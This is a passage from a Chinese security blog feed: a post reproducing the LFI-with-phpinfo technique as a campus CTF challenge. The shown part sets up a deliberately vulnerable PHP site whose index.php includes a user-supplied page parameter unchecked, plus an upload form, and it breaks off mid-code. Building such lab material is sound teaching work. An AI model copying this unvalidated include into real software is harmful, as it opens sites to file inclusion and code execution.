src="data:image/gif;base64,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"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看往年wp的时候看到了这么一个漏洞，感觉挺有意思就复现一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="文件包含" scheme="http://Err0rzz.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>lfi_phpinfo</title>
    <link href="http://Err0rzz.github.io/2018/03/26/lfi-phpinfo/"/>
    <id>http://Err0rzz.github.io/2018/03/26/lfi-phpinfo/</id>
    <published>2018-03-26T06:21:34.000Z</published>
    <updated>2018-03-26T08:11:06.658Z</updated>
    
    <content type="html"><![CDATA[<p>一个挺老的文件包含利用，感觉很有意思就复现了一下(顺便拿来做了个校赛题目)<br><a id="more"></a></p><p>参考文档：<br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/79830.html</a><br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external"> https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a><br><a href="https://blog.csdn.net/bnxf00000/article/details/49047057" target="_blank" rel="external">https://blog.csdn.net/bnxf00000/article/details/49047057</a></p><h1 id="服务器环境搭建："><a href="#服务器环境搭建：" class="headerlink" title="服务器环境搭建："></a>服务器环境搭建：</h1><p>dockerfile:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">FROM php:5.6-apache</div><div class="line">MAINTAINER zz</div></pre></td></tr></table></figure></p><p>phpinfo.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpphpinfo();?&gt;</div></pre></td></tr></table></figure></p><p>index.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"> &lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line">&lt;?php</div><div class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</div><div class="line">include &apos;config.php&apos;;</div><div class="line">if (isset($_GET[&apos;page&apos;])) &#123;</div><div class="line">    $page = $_GET[&apos;page&apos;];</div><div class="line"></div><div class="line">&#125; else &#123;</div><div class="line">    $page = &quot;home&quot;;</div><div class="line">&#125;</div><div class="line">$file =   $page . &quot;.php&quot;;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</div><div class="line">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</div><div class="line"></div><div class="line">        &lt;title&gt;ZJGSU&lt;/title&gt;</div><div class="line"></div><div class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</div><div class="line">            &lt;div class=&quot;container&quot;&gt;</div><div class="line">                &lt;div class=&quot;navbar-header&quot;&gt;</div><div class="line">                    &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;</div><div class="line">                        &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                    &lt;/button&gt;</div><div class="line">                    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt;</div><div class="line">                &lt;/div&gt;</div><div class="line">                &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;</div><div class="line">                    &lt;ul class=&quot;nav navbar-nav&quot;&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;submit&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=submit&quot;&gt;Submit&lt;/a&gt;&lt;/li&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</div><div class="line">                    &lt;/ul&gt;</div><div class="line">                &lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">        &lt;/nav&gt;</div><div class="line"></div><div class="line">        &lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt;</div><div class="line">            &lt;?php</div><div class="line">                include($file);</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt;</div><div class="line">        &lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>submit.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line"></div><div class="line">&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;upload.php&quot; method=&quot;POST&quot; /&gt;</div><div class="line">&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;100000&quot; /&gt;</div><div class="line">Choose an image to upload:</div><div class="line">&lt;br /&gt;</div><div class="line">&lt;input name=&quot;uploaded&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;</div><div class="line">&lt;br /&gt;</div><div class="line">&lt;input type=&quot;submit&quot; name=&quot;Upload&quot; value=&quot;Upload&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">请上传jpg gif png 格式的文件  文件大小不能超过100KiB&lt;br&gt;</div></pre></td></tr></table></figure></p><p>upload.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"> &lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line"> &lt;?php</div><div class="line">//error_reporting(0);</div><div class="line"> include &apos;config.php&apos;;</div><div class="line"></div><div class="line">function get_random_token()&#123;</div><div class="line">    $random_token = &apos;&apos;;</div><div class="line">    $str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;;</div><div class="line">    for($i = 0; $i &lt; 16; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(1, 61), 1);</div><div class="line">    &#125;</div><div class="line">    return $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function deletefile($dir)&#123;</div><div class="line">  $dh=opendir($dir);</div><div class="line">  while ($file=readdir($dh)) &#123;</div><div class="line">    if($file!=&quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) &#123;</div><div class="line">      $fullpath=$dir.&quot;/&quot;.$file;</div><div class="line">      if(!is_dir($fullpath)) &#123;</div><div class="line">          unlink($fullpath);</div><div class="line">      &#125; else &#123;</div><div class="line">          deldir($fullpath);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  closedir($dh);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"> if (isset($_POST[&apos;Upload&apos;])) &#123;</div><div class="line"></div><div class="line">            $target_path =&quot;./Err0r/&quot;;</div><div class="line">            $target_name=get_random_token();</div><div class="line">            $target_path = $target_path . $target_name;</div><div class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</div><div class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</div><div class="line">            $uploaded_size = 